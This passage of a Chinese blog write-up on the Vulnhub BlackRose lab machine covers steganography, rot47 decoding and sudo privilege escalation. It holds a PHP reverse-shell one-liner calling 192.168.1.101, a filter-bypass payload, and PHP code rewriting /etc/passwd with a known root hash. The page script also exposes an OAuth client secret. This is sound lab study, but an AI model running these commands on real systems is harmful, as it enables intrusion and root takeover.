  <br>┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ steghide info background-image.jpg <br><span class="hljs-string">&quot;background-image.jpg&quot;</span>:<br>  format: jpeg<br>  capacity: 10.9 KB<br>Try to get information about embedded data ? (y/n) y<br>Enter passphrase: <br>steghide: could not extract any data with that passphrase!<br></code></pre></td></tr></table></figure>
+
+<p>steghide 提示需要 <code>passphrase</code> 才能提取信息，将上面解密得到的字符作为 <code>passphrase</code> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ steghide info background-image.jpg<br><span class="hljs-string">&quot;background-image.jpg&quot;</span>:<br>  format: jpeg<br>  capacity: 10.9 KB<br>Try to get information about embedded data ? (y/n) y<br>Enter passphrase: <br>  embedded file <span class="hljs-string">&quot;password&quot;</span>:<br>    size: 31.0 Byte<br>    encrypted: rijndael-128, cbc<br>    compressed: <span class="hljs-built_in">yes</span><br><br>┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ steghide extract -sf background-image.jpg<br>Enter passphrase: <br>wrote extracted data to <span class="hljs-string">&quot;password&quot;</span>.<br><br>┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ <span class="hljs-built_in">cat</span> password    <br>s)M8Z=7|8/&amp;YY-zK5L$.w3Su<span class="hljs-string">&#x27;Q@nGR</span><br></code></pre></td></tr></table></figure>
+
+<p>对于字符 <code>s)M8Z=7|8/&amp;YY-zK5L$.w3Su&#39;Q@nGR</code> 又需要再一次尝试加密与编码</p>
+<blockquote>
+<p>这个密码看起来依旧是加密的，经过查找，发现是 rot47</p>
+</blockquote>
+<p>关于这个描述和判断，比较疑惑，在一篇博客中找到了一种途径。<a target="_blank" rel="noopener" href="https://shubham-singh.medium.com/blackrose-1-walkthrough-vulnhub-b0517597e15c">BlackRose: 1 Walkthrough (Vulnhub) | by Shubham Kumar | Medium</a></p>
+<p>使用的工具是 <a target="_blank" rel="noopener" href="https://github.com/oreosES/autodecoder">oreosES&#x2F;autodecoder: AutoDecoder tool for CTFs (github.com)</a></p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">┌──(kali㉿kali)-[~/tools/autodecoder]</span><br><span class="hljs-attribute">└─$ python3 audodecoder.py --message &quot;s)M8Z=7|8/&amp;YY-zK5L$.w3Su&#x27;Q@nGR&quot;</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">atbash &gt; atbash</span><span class="hljs-punctuation">:</span> <span class="hljs-string">SMZYYZKLWSUQNGR                                                                                    </span><br><span class="hljs-attribute">atbash &gt; caesar</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KQDEEDSRGKIMPWL                                                                                    </span><br><span class="hljs-attribute">atbash &gt; rot13</span><span class="hljs-punctuation">:</span> <span class="hljs-string">UANOONCBQUSWZGV                                                                                     </span><br><span class="hljs-attribute">atbash &gt; rot47</span><span class="hljs-punctuation">:</span> <span class="hljs-string">w&#125;pqqp!~swuy|%x                                                                                     </span><br><span class="hljs-attribute">caesar &gt; atbash</span><span class="hljs-punctuation">:</span> <span class="hljs-string">YKXYYRMLUEWGDQF                                                                                    </span><br><span class="hljs-attribute">caesar &gt; caesar</span><span class="hljs-punctuation">:</span> <span class="hljs-string">E)S8F=7|8/&amp;EE-LQ5R$.I3YG&#x27;W@ZMX                                                                     </span><br><span class="hljs-attribute">caesar &gt; rot13</span><span class="hljs-punctuation">:</span> <span class="hljs-string">O)C8P=7|8/&amp;OO-VA5B$.S3IQ&#x27;G@JWH                                                                      </span><br><span class="hljs-attribute">caesar &gt; rot47</span><span class="hljs-punctuation">:</span> <span class="hljs-string">qX!grlfMg^Uqq\x&#125;d~S]ub&#x27;sV%o(y&amp;                                                                      </span><br><span class="hljs-attribute">rot13 &gt; atbash</span><span class="hljs-punctuation">:</span> <span class="hljs-string">UANOONCBQUSWZGV                                                                                     </span><br><span class="hljs-attribute">rot13 &gt; caesar</span><span class="hljs-punctuation">:</span> <span class="hljs-string">O)C8P=7|8/&amp;OO-VA5B$.S3IQ&#x27;G@JWH                                                                      </span><br><span class="hljs-attribute">rot13 &gt; rot13</span><span class="hljs-punctuation">:</span> <span class="hljs-string">s)M8Z=7|8/&amp;YY-zK5L$.w3Su&#x27;Q@nGR                                                                       </span><br><span class="hljs-attribute">rot13 &gt; rot47</span><span class="hljs-punctuation">:</span> <span class="hljs-string">7X+g|lfMg^U&#123;&#123;\&gt;)d*S];bu9Vso2%t                                                                       </span><br><span class="hljs-attribute">rot47 &gt; atbash</span><span class="hljs-punctuation">:</span> <span class="hljs-string">WCTOUNTFPAWHSYUELE                                                                                  </span><br><span class="hljs-attribute">rot47 &gt; caesar</span><span class="hljs-punctuation">:</span> <span class="hljs-string">GA|P+UOPP^X**\NIM&#123;V]KK$IY&quot;X?E#                                                                      </span><br><span class="hljs-attribute">rot47 &gt; rot13</span><span class="hljs-punctuation">:</span> <span class="hljs-string">QK|t+ysZt^H**\Xmq&#123;F]Uo$SI&quot;b?i#                                                                       </span><br><span class="hljs-attribute">rot47 &gt; rot47</span><span class="hljs-punctuation">:</span> <span class="hljs-string">s)M8Z=7|8/&amp;YY-zK5L$.w3Su&#x27;Q@nGR</span><br></code></pre></td></tr></table></figure>
+
+<p>从结果可以判断出，可能是 rot13 或者 rot47</p>
+<p><img src="/pic/932d8c6ac801535da99ae33e66bef49b_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用 <code>DX|g+lfMg^U**\Kzd&#123;S]Hb$FV&quot;o?v#</code> 切换登录到 yourname 用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ <span class="hljs-built_in">cat</span> user.txt<br>688286be9a2df84e90122da12cd7ea2e<br>yourname@BlackRose:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> yourname on BlackRose:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User yourname may run the following commands on BlackRose:<br>    (root : root) NOPASSWD: /usr/bin/blackrose<br></code></pre></td></tr></table></figure>
+
+<p>发现了一个特别的程序，可以使用 root 权限无密码运行</p>
+<p>接下来关于这个程序，又有一个很难想到的点，首先这个程序运行后提示读取文件，但是输入一般的文件名会提示无效</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ sudo /usr/bin/blackrose<br>File <span class="hljs-built_in">read</span>~<span class="hljs-comment"># /etc/passwd                                                                                             </span><br>Invalid file <span class="hljs-built_in">read</span><br></code></pre></td></tr></table></figure>
+
+<p>这里程序只接受 php 文件的路径，同时这个文件的权限决定了我们没法拿到本地逆向。所以关于可接受文件类型的判断，也是一个很容易卡住的点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ <span class="hljs-built_in">ls</span> -liah /usr/bin/blackrose<br>2502921 -rwx------ 1 root root 1.3K Dec  1  2019 /usr/bin/blackrose<br></code></pre></td></tr></table></figure>
+
+<p>之后我们将反弹 shell 的文件写入 1.php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php $sock=fsockopen(&quot;192.168.1.101&quot;,443);system(&quot;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;); ?&gt;&#x27;</span> &gt; 1.phpyourname@BlackRose:~$ sudo /usr/bin/blackrose ./1.php <br>File <span class="hljs-built_in">read</span>~<span class="hljs-comment"># 1.php</span><br>Dangerous <span class="hljs-keyword">function</span> found<br>yourname@BlackRose:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php $sock=fsockopen(&quot;192.168.1.101&quot;,443);popen(&quot;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;); ?&gt;&#x27;</span> &gt; 1.php <br>yourname@BlackRose:~$ sudo /usr/bin/blackrose<br>File <span class="hljs-built_in">read</span>~<span class="hljs-comment"># 1.php</span><br>Dangerous <span class="hljs-keyword">function</span> found<br></code></pre></td></tr></table></figure>
+
+<p>又遇到了新的问题，似乎有危险函数的过滤。尝试自己绕过参考博客 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass#bypass-using-php-capabilities">PHP - Useful Functions &amp; disable_functions&#x2F;open_basedir bypass - HackTricks</a></p>
+<p><img src="/pic/45e2a6a9cfc947509b30f61c7cda40dd_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>先是尝试 chown，发现无法赋予 SUID 权限，尝试读取和写入文件，发现读取和写入 <code>file_put_contents</code> 函数可用，我先是读取了一下 shadow 文件的内容，发现使用 hashcat 爆破失败，那就尝试写入到 passwd 文件吧</p>
+<p>先生成简单的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ openssl passwd 123456<br>l.ceEHjBRBt96<br></code></pre></td></tr></table></figure>
+
+<p>用 chatgpt 使用 <code>file_put_contents</code> 函数生成替换文件第一行内容的代码。但是发现程序或许会匹配 root 关键字，我们需要简单地处理一下，以便绕过。自己尝试的话，建议先别拿 passwd 尝试，用普通文件先测试，确认无误后再对 passwd 进行修改，同时建议备份一下原有的 <code>/etc/passwd</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/etc/passwd&#x27;</span>;<br><span class="hljs-variable">$newContent0</span> = <span class="hljs-string">&#x27;roo&#x27;</span>;<br><span class="hljs-variable">$newContent1</span> = <span class="hljs-string">&#x27;t:&#x27;</span>;<br><span class="hljs-variable">$newContent2</span> = <span class="hljs-string">&#x27;l.ceEHjBRBt96&#x27;</span>;<br><span class="hljs-variable">$newContent3</span> = <span class="hljs-string">&#x27;:0:0:roo&#x27;</span>;<br><span class="hljs-variable">$newContent4</span> = <span class="hljs-string">&#x27;t:/roo&#x27;</span>;<br><span class="hljs-variable">$newContent5</span> = <span class="hljs-string">&#x27;t:/bin/bas&#x27;</span>;<br><span class="hljs-variable">$newContent6</span> = <span class="hljs-string">&#x27;h&#x27;</span>;<br><span class="hljs-variable">$newContent</span> = <span class="hljs-variable">$newContent0</span> . <span class="hljs-variable">$newContent1</span> . <span class="hljs-variable">$newContent2</span> . <span class="hljs-variable">$newContent3</span> . <span class="hljs-variable">$newContent4</span> . <span class="hljs-variable">$newContent5</span> . <span class="hljs-variable">$newContent6</span>;<br><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);  <br><br><span class="hljs-variable">$firstLineEndPos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;\n&quot;</span>);  <br>  <br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$firstLineEndPos</span> !== <span class="hljs-literal">false</span>) &#123;  <br>    <span class="hljs-variable">$firstLine</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$content</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$firstLineEndPos</span> + <span class="hljs-number">1</span>);  <br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$firstLine</span>, <span class="hljs-variable">$newContent</span> . <span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-variable">$content</span>);  <br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span>);  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);  <br>&#125; <span class="hljs-keyword">else</span> &#123;  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>将上述代码写入 1.php，尝试借助 blackrose 运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ sudo /usr/bin/blackrose<br>File <span class="hljs-built_in">read</span>~<span class="hljs-comment"># 1.php</span><br>root:l.ceEHjBRBt96:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin<br>syslog:x:102:106::/home/syslog:/usr/sbin/nologin<br>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin<br>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin<br>lxd:x:105:65534::/var/lib/lxd/:/bin/false<br>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin<br>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<br>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:109:1::/var/cache/pollinate:/bin/false<br>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin<br>mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false<br>delx:x:1002:1002:,,,:/home/delx:/bin/bash<br>yourname:x:1001:1001:,,,:/home/yourname:/bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>成功写入，接下来切换为 root 身份，密码为 <code>123456</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ su<br>Password: <br>root@BlackRose:/home/yourname<span class="hljs-comment"># cd /root</span><br>root@BlackRose:~<span class="hljs-comment"># ls -liah</span><br>total 36K<br>2097153 drwx------  6 root root 4.0K Jul 11  2020 .<br>      2 drwxr-xr-x 24 root root 4.0K Nov 13  2019 ..<br>2097158 lrwxrwxrwx  1 root root    9 Dec  3  2019 .bash_history -&gt; /dev/null<br>2097154 -rw-r--r--  1 root root 3.1K Dec  3  2019 .bashrc<br>2097164 drwx------  2 root root 4.0K Dec  5  2019 .cache<br>2097162 drwx------  3 root root 4.0K Nov  7  2019 .gnupg<br>2097159 drwxr-xr-x  3 root root 4.0K Nov  7  2019 .<span class="hljs-built_in">local</span><br>2097155 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>2097168 -rw-r--r--  1 root root  511 Jul 11  2020 root.txt<br>2097156 drwx------  2 root root 4.0K Sep  7  2019 .ssh<br>root@BlackRose:~<span class="hljs-comment"># cat root.txt </span><br>     _                   _                           _                   <br>    | | _____      _____| |   __      ____ _ ___    | |__   ___ _ __ ___ <br> _  | |/ _ \ \ /\ / / _ \ |   \ \ /\ / / _` / __|   | <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__/ _ \<br>| |_| |  __/\ V  V /  __/ |    \ V  V / (_| \__ \   | | | |  __/ | |  __/<br> \___/ \___| \_/\_/ \___|_|     \_/\_/ \__,_|___/   |_| |_|\___|_|  \___|<br>                                                                The box made by Jewel                               <br><br><br><br>7dcbcf000f38c8d2c0024011899ec84e<br><br>I thank you so much <span class="hljs-keyword">for</span> playing - Jewel :)<br><br></code></pre></td></tr></table></figure>
+
+<p>结束战斗。</p>
+<p>补充，话说 chmod 虽然不能赋予 SUID 权限，但是可以降低 passwd 的权限啊</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ <span class="hljs-built_in">cat</span> 2.php<br>&lt;?php<br><span class="hljs-built_in">chmod</span>(<span class="hljs-string">&quot;/etc/passwd&quot;</span>,0777);<br>?&gt;<br>yourname@BlackRose:~$ sudo /usr/bin/blackrose<br>File <span class="hljs-built_in">read</span>~<span class="hljs-comment"># 2.php</span><br>yourname@BlackRose:~$ <span class="hljs-built_in">ls</span> -alih /etc/passwd<br>3154567 -rwxrwxrwx 1 root root 1.7K Oct 14 08:48 /etc/passwd<br>yourname@BlackRose:~$ vim /etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p>参考的 WP 中使用的是一种更简单的绕过手法，但是这种方法我过去没有见过，搜索结果中也没显示，这里记录一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php (sy.(sy).em)(&#x27;/bin/sh&#x27;) ?&gt;&quot;</span> &gt;1/php<br></code></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>登录框测试点</p>
+<ul>
+<li>登录绕过（逻辑问题，语言特性）</li>
+<li>sql 注入（万能密码）</li>
+<li>弱口令（爆破）</li>
+<li>二次注入</li>
+<li>注册覆盖</li>
+<li>未授权访问（目录扫描）</li>
+</ul>
+<p>一些 CTF 技巧实际上是本身就带有试错成本，尤其是编码问题，比如这台靶机如何判断是 AES 加密，如何判断是 rot47。更多的是对加密算法使用习惯和频率的熟悉才能在思维上让你想到，加上不断的试错。</p>
+<p>除此之外，有必要偶尔看看别人的博客和一些渗透方面技巧的总结，比如这里的登录绕过，很简单但是我过去没碰到过，就完全想不到，甚至没意识去搜索登录绕过。以后要时不时翻翻 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/welcome/readme">HackTricks - HackTricks</a></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.hetianlab.com/specialized/20220406150732">挖洞实战之信息泄露与前端加密 - 合天网安实验室 (hetianlab.com)</a> 中提到的密码工具箱 <a target="_blank" rel="noopener" href="https://github.com/oreosES/autodecoder">oreosES&#x2F;autodecoder: AutoDecoder tool for CTFs (github.com)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BlackRose 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/10/fcad96c9b901.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/18e513304239.html" title="broken_2020 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">broken_2020 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/d108ba760c3e.html" title="sunset_sundown 靶机">
+                        <span class="hidden-mobile">sunset_sundown 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'f2666f171bb1e7b24b3fa578d5d51d86'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
